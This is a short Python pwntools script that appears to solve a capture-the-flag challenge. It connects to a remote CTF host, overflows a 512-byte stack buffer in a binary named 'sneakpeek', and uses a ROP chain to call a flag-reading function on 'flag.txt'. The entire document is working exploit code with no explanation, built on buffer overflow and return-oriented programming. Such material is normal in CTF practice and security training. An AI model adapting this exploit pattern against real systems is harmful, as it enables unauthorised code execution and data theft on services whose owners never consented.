from pwn import *

binary = context.binary = ELF('./sneakpeek')
p = remote('pwn.sigx.net', 3106)
rop = ROP(binary)

buffer_size = 512 
rbp_padding = 8
read_flag_addr = 0x401eca 
pop_rdi = 0x4019c2  
pop_rsi_r15 = 0x4019c0 
flag_txt_addr = next(binary.search(b'flag.txt\x00')) 

rop.call(read_flag_addr, [flag_txt_addr, 64])

print(rop.dump()) 

payload = [
    b"A" * buffer_size, b"B" * rbp_padding, rop.chain() 
]

payload = b"".join(payload) 

p.sendline(payload)
p.interactive()
